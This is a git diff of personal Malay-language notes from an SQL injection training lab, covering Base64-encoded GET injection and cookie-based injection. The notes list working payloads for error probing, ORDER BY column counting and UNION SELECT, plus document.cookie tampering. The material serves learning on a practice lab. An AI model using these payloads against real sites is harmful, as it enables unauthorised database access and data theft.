@@ -117,47 +117,48 @@ SQL Injection Training Lab notes for myself
 
 ## Level E - Base64 GET SQL Injection
 
-maksud encoded ialah berbeza bentuk contoh biasa Base64
-Base64 `a-z` `A-Z` `0-9` `/` `+` dan 4 data iaitu `XX==` `XXX=` `XXXX`
+- notes: encoded bermaksud berbeza bentuk contoh ialah Base10, Base64
+- Base64 `a-z` `A-Z` `0-9` `/` `+` dan 4 data iaitu `XX==` `XXX=` `XXXX`
+- boleh guna online tools [Base64 decode encode](https://www.base64decode.org/)
 
-payload `1'` convert `MSc=` untuk check error page
+- payload `1'` convert B64 `MSc=` untuk check web error
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/8ae0dcee-a744-4c48-9f98-b1504516374e)
 
-payload `1'-- ` convert `MSctLSA=` untuk repair page dan vuln page
+- payload `1'-- ` convert B64 `MSctLSA=` web menjadi normal dan web ada vuln
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5452bec6-df24-4917-9c15-44fe740658ad)
 
-payload `1' order by 5-- ` convert `MScgb3JkZXIgYnkgNS0tIA==` kenapa 5 sebab db ada 5 column dan 6 dpt error
+- payload `1' order by 5-- ` convert B64 `MScgb3JkZXIgYnkgNS0tIA==` kenapa 5 sebab db ada 5 col dan col 6 dapat error
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5a8141c0-ae0f-40da-bbca-565ca9a7e62f)
 
-payload `-1' union all select 1,2,3,4,5-- ` convert `LTEnIHVuaW9uIGFsbCBzZWxlY3QgMSwyLDMsNCw1LS0g` untuk check name dan email berada di column mana dlm db
+- payload `-1' union all select 1,2,3,4,5-- ` convert B64 `LTEnIHVuaW9uIGFsbCBzZWxlY3QgMSwyLDMsNCw1LS0g` untuk check username dan email berada di col mana dalam db
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/3ff88ac0-e86a-4e67-8444-b748dec2f61f)
 
-dan step seterusnya sama dgn level lain.
+- step seterusnya sama dengan level2 lain
 
 ## Level H - Cookie Base SQL Injection
-untuk check cookie buka `developer tools` atau button `f12` atau `inspect element` di browser bahagian console taip `document.cookie`
-dan cookie disimpan di browser
+- Notes: untuk check cookie buka `developer tools` atau button `f12` atau `inspect element` di browser bahagian console taip `document.cookie`
+- Notes: cookie disimpan di browser
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c75cd5b3-a35f-4532-b367-d2ac0bae1b0d)
 
-payload `document.cookie = "userid=2"` untuk tukar kpd user 2
+- payload `document.cookie = "userid=2"` untuk tukar kepada user 2
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/afc4f45f-14b4-4630-b112-35f95ff72dd7)
 
-payload `document.cookie = "userid=2'"` untuk check error page
+- payload `document.cookie = "userid=2'"` untuk check web error
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/33eb3578-4dcb-490b-bb42-e47d96dc5b34)
 
-payload `document.cookie = "userid=1'-- -"` untuk repair dan page ada vuln
+- payload `document.cookie = "userid=1'-- -"` wen menjadi normal dan web ada vuln
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7fa4c83f-7ff9-47f2-bdfd-6571455c7053)
 
-payload  `document.cookie = "userid=-1'union all select 1,2,3,4,5 -- -"` untuk check name dan email berada di  column mana dlm db
+- payload  `document.cookie = "userid=-1'union all select 1,2,3,4,5 -- -"` untuk check username dan email berada di col mana dalam db
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1bb83ee-4f2c-4f67-97e8-848717a43582)
 
-dan step seterunya sama dgn level sebelumnya
+- step seterunya sama dengan level2 sebelumnya
